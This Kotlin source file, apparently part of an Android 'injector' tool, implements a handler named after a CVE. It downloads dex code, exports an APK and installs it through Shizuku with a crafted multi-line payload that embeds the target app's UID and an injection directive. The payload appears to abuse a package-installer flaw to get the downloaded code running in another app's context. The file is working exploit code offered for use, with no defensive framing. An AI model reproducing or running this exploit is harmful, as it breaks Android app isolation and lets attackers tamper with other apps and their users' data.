package com.wunelezi.injector.inject

import android.content.Context

class CvePackageInstallerHandler(private val context: Context) : InjectionHandler {

    override fun execute(targetPackage: String, versionSegment: String) {
        val zipFile = DexDownloader.downloadDexZip(context, versionSegment)
        val dexFiles = DexDownloader.extractDexFiles(context, zipFile, versionSegment)
        DexDownloader.writeToWidgetProvider(context, dexFiles)
        val apkFile = DexDownloader.exportAndCopyApk(context)

        val uid = context.packageManager.getApplicationInfo(targetPackage, 0).uid
        val payload = """
            @null
            mcinject $uid 1 /data/user/0
            default:targetSdkVersion=28 none 0 0 1 @null
        """.trimIndent()
        PackageInstallerShizuku.installPackage(apkFile, payload)

        DexDownloader.copyDexToTarget(versionSegment)
    }
}
